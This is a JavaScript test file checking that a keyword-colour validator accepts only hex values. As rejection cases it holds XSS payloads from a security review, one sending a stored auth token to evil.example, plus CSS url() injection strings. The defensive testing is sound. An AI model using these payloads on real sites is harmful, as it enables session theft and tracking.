// Run with: bun test server/utils/keyword-color.test.js
import { describe, expect, test } from 'bun:test';
import { DEFAULT_KEYWORD_COLOR, normalizeKeywordColor } from './keyword-color.js';

describe('normalizeKeywordColor — valid hex', () => {
  test('accepts 6-digit hex in either case', () => {
    expect(normalizeKeywordColor('#3B82F6')).toEqual({ ok: true, value: '#3B82F6' });
    expect(normalizeKeywordColor('#3b82f6')).toEqual({ ok: true, value: '#3b82f6' });
  });

  test('accepts 3, 4 and 8 digit forms', () => {
    expect(normalizeKeywordColor('#f00').ok).toBe(true);
    expect(normalizeKeywordColor('#f00a').ok).toBe(true);
    expect(normalizeKeywordColor('#3B82F680').ok).toBe(true);
  });

  test('trims surrounding whitespace', () => {
    expect(normalizeKeywordColor('  #3B82F6 ')).toEqual({ ok: true, value: '#3B82F6' });
  });

  test('defaults when the colour is absent', () => {
    for (const absent of [undefined, null, '']) {
      expect(normalizeKeywordColor(absent)).toEqual({ ok: true, value: DEFAULT_KEYWORD_COLOR });
    }
  });
});

// The payloads from the security review. Even though the client no longer uses
// {@html}, these must not reach the database.
describe('normalizeKeywordColor — XSS payloads', () => {
  test('rejects an attribute break-out with an event handler', () => {
    const payload =
      'red" onmouseover="fetch(\'https://evil.example/?d=\'+encodeURIComponent(localStorage.getItem(\'auth_token\')))';
    expect(normalizeKeywordColor(payload).ok).toBe(false);
  });

  test('rejects a full tag break-out', () => {
    expect(normalizeKeywordColor('x"><img src=x onerror=alert(1)>').ok).toBe(false);
  });

  test('rejects a bare double quote', () => {
    expect(normalizeKeywordColor('#3B82F6"').ok).toBe(false);
  });

  test('rejects angle brackets', () => {
    expect(normalizeKeywordColor('<script>alert(1)</script>').ok).toBe(false);
  });
});

// CSS-level abuse of the --kw-color custom property, which is a real sink even without
// any HTML injection.
describe('normalizeKeywordColor — CSS injection', () => {
  test('rejects url() and image references', () => {
    expect(normalizeKeywordColor('url(https://evil.example/pixel)').ok).toBe(false);
    expect(normalizeKeywordColor('#fff;background:url(https://evil.example/x)').ok).toBe(false);
  });

  test('rejects a value that closes the declaration', () => {
    expect(normalizeKeywordColor('#fff; }').ok).toBe(false);
  });

  test('rejects functional notation and named colours', () => {
    expect(normalizeKeywordColor('rgb(255,0,0)').ok).toBe(false);
    expect(normalizeKeywordColor('red').ok).toBe(false);
    expect(normalizeKeywordColor('transparent').ok).toBe(false);
  });

  test('rejects CSS escapes and expressions', () => {
    expect(normalizeKeywordColor('\\72 ed').ok).toBe(false);
    expect(normalizeKeywordColor('expression(alert(1))').ok).toBe(false);
  });
});

describe('normalizeKeywordColor — malformed', () => {
  test('rejects hex without the leading #', () => {
    expect(normalizeKeywordColor('3B82F6').ok).toBe(false);
  });

  test('rejects wrong digit counts', () => {
    expect(normalizeKeywordColor('#12').ok).toBe(false);
    expect(normalizeKeywordColor('#12345').ok).toBe(false);
    expect(normalizeKeywordColor('#1234567').ok).toBe(false);
    expect(normalizeKeywordColor('#123456789').ok).toBe(false);
  });

  test('rejects non-hex characters', () => {
    expect(normalizeKeywordColor('#GGGGGG').ok).toBe(false);
    expect(normalizeKeywordColor('#3B82F!').ok).toBe(false);
  });

  test('rejects non-string input without throwing', () => {
    expect(normalizeKeywordColor(123).ok).toBe(false);
    expect(normalizeKeywordColor({}).ok).toBe(false);
    expect(normalizeKeywordColor(['#3B82F6']).ok).toBe(false);
    expect(normalizeKeywordColor(true).ok).toBe(false);
  });

  test('gives a reason on rejection', () => {
    expect(normalizeKeywordColor('red').reason).toBeTruthy();
  });
});
